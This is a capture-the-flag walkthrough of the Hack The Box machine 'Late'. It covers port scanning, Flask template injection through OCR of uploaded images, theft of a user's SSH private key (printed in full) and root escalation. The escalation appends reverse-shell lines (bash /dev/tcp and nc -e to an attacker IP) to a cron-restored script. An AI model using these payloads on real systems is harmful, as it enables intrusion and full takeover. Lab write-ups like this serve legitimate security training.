# Hackthebox - Late

- Linux

![Late](../.res/HTB-Late.png)

- [Box on HTB](https://app.hackthebox.com/machines/463)

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T5 -sC -sV -O -p- 10.129.168.169
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 18:52 EDT
Nmap scan report for 10.129.168.169
Host is up (0.023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.50 seconds
```

## Port 80

- We have a website for pics  
![image](https://user-images.githubusercontent.com/96747355/165406647-7de17ebc-353f-46f0-8281-ff3ddc624b73.png)  
- There is a link http://images.late.htb/ let's change `/etc/hosts` file  
![image](https://user-images.githubusercontent.com/96747355/165407160-0ef8db14-62e4-4d19-a548-84be36a9913b.png)  
- We get a form to upload image.  
  I got stuck with this for while on where was the injection point. Because the image uploaded is actually suppose to give you text. I already knew that I had to exploit flask because I had done it in a previous box. I was just stuck on where to put my paylaod. And finally it hit me. I had to write my payload in a text editor make it very big, screen it and upload the resulting image to the server. So I tried the usual first payload for flask {{7*7}}  
![image](https://user-images.githubusercontent.com/96747355/167275908-f219dc0c-1a31-4588-a00d-2c8e23ae942e.png)  
- And right after the upload I got this beautiful text indicating that my payload worked!
```
<p>49
</p>
```
- It is now time to try to get a reverse shell using this trick!
- After a few tries I got a working `ls`  
![ls7](https://user-images.githubusercontent.com/96747355/167315404-ad79b042-d722-4684-9260-914cf3ca6e0c.png)  
(Done with mousepad and then zoomed in)

```
<p>name=main.py
misc
__pycache__
static
templates
uploads
wsgi.py

</p>
```
- ls on home gives this so we have a user `svc_acc`
```
<p>name=svc_acc

</p>
```
- Let's make an `id`
```
<p>name=uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)

</p>
```
- `uname -a`
```
<p>name=Linux late 4.15.0-175-generic #184-Ubuntu SMP Thu Mar 24 17:48:36 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
</p>
```
- We also took the user flag using this image  
![catuser](https://user-images.githubusercontent.com/96747355/167316087-f8216127-6770-4607-b386-8e298dec273b.png)  
- I was about to try to get a reverse shell but I decided to make a sanity check to see if we had ssh keys.
- Indeed, with the enum we find a folder .ssh  
![image](https://user-images.githubusercontent.com/96747355/167316058-fc398643-6b23-4eb9-9279-206a053110d6.png)  

```
<p>name=total 40
drwxr-xr-x 7 svc_acc svc_acc 4096 Apr  7 13:51 .
drwxr-xr-x 3 root    root    4096 Jan  5 10:44 ..
drwxrwxr-x 7 svc_acc svc_acc 4096 Apr  4 13:28 app
lrwxrwxrwx 1 svc_acc svc_acc    9 Jan 16 18:45 .bash_history -&gt; /dev/null
-rw-r--r-- 1 svc_acc svc_acc 3771 Apr  4  2018 .bashrc
drwx------ 3 svc_acc svc_acc 4096 Apr  7 13:51 .cache
drwx------ 3 svc_acc svc_acc 4096 Jan  5 10:45 .gnupg
drwxrwxr-x 5 svc_acc svc_acc 4096 Jan  5 12:13 .local
-rw-r--r-- 1 svc_acc svc_acc  807 Apr  4  2018 .profile
drwx------ 2 svc_acc svc_acc 4096 Apr  7 11:08 .ssh
-rw-r----- 1 root    svc_acc   33 May  7 23:30 user.txt

</p>
```

- And we have a private key  
![ls-ssh](https://user-images.githubusercontent.com/96747355/167316199-f08b56f4-0b20-4672-b52c-c761bbe1ec01.png)  
```
<p>name=total 20
drwx------ 2 svc_acc svc_acc 4096 Apr  7 11:08 .
drwxr-xr-x 7 svc_acc svc_acc 4096 Apr  7 13:51 ..
-rw-rw-r-- 1 svc_acc svc_acc  394 Apr  7 11:08 authorized_keys
-rw------- 1 svc_acc svc_acc 1679 Apr  7 11:08 id_rsa
-rw-r--r-- 1 svc_acc svc_acc  394 Apr  7 11:08 id_rsa.pub
</p>
```
- We get the private key!  
![catrsa](https://user-images.githubusercontent.com/96747355/167316265-851688c0-1ceb-478a-9055-521c39101525.png)  
```
<p>name=-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

</p>
```
- Let's remove useless chars from the key and try to ssh to the box using it
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
```
- `chmod 600 id_rsa_svc-acc`
- `ssh -i id_rsa_svc-acc svc_acc@10.10.11.156`
- We are connected, this foothold was really painful and required patience because the size of the font in the image matters a lot. Here are a few tips if you are stuck.
  - The payloads have to be in one line 
  - I used mousepad with a light theme and zoomed in to make the font bigger
  - If for some reason the exploit did not work because of the size of the font get back to the font that was working before and make edit your picture in gimp or another similar tool by taking the 2 parts of the line to make it in one line 
![image](https://user-images.githubusercontent.com/96747355/167316768-0108325a-9b93-40aa-9dc3-74203ae10977.png)  

## Privilege escalation

- Let's enumerate the machine with linpeas `wget https://github.com/carlospolop/PEASS-ng/releases/download/20220508/linpeas_linux_amd64`
- `python3 -m http.server 80` we serve our file with python http server
- `wget http://10.10.14.11/linpeas_linux_amd64` we get the file in our target
- `chmod +x linpeas_linux_amd64` we make it executable

### LinePeas result analysis

- https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files  
![image](https://user-images.githubusercontent.com/96747355/167317073-13049c95-fb66-455a-991b-b4dd6046dacc.png)  
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths  
![image](https://user-images.githubusercontent.com/96747355/167317128-25467f95-3898-4c08-bfac-f2fd2cf398a6.png)  
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs  
![image](https://user-images.githubusercontent.com/96747355/167317167-4980613d-d53c-4aaa-87e6-3ceb1c7b26af.png)  
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses  
![image](https://user-images.githubusercontent.com/96747355/167317192-868ed2c8-51d1-4fb5-b88a-1dea2ec158a2.png)  
```
/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                                                                                                  
New path exported: /home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

- We have to investigate this folder and the script `ssh-alert.sh`  
![image](https://user-images.githubusercontent.com/96747355/167317407-29fe0f28-1b59-4982-ab00-18d9799d402f.png)  
- The script sends an email when someone logs in using ssh.
- We can check the processes with pspy these are interesting and they are launched as root
```
/usr/sbin/CRON -f 
chattr -a /usr/local/sbin/ssh-alert.sh 
cp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh 
chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh
rm -r /home/svc_acc/app/uploads/* 
rm -r /home/svc_acc/app/misc/*
```
- So now we know that a process is using chatter to make ssh-alert appendable
- We could append the file with a malicious command and get a reverse shell this way. We would trigger it by connecting through ssh. We have to be fast though because a cron job reverts the files regularly.
- Let's launch a listener `rlwrap nc -lvp 4444`
- *Note: I first tried to append the file with nc `echo 'nc 10.10.14.11 4444 –e /bin/bash' >> ssh-alert.sh` as it was installed in the machine but the shell I caught back did not let me run commands*
- `echo '/bin/bash -i >& /dev/tcp/10.10.14.11/4444 0>&1' >> ssh-alert.sh` This one did the trick
- Then from our machine we connect through ssh
- And finally we catch a root shell and can grab the final flag!!  
![image](https://user-images.githubusercontent.com/96747355/167514748-b43c4f38-c416-4eb2-9276-4bd9f12a9401.png)  
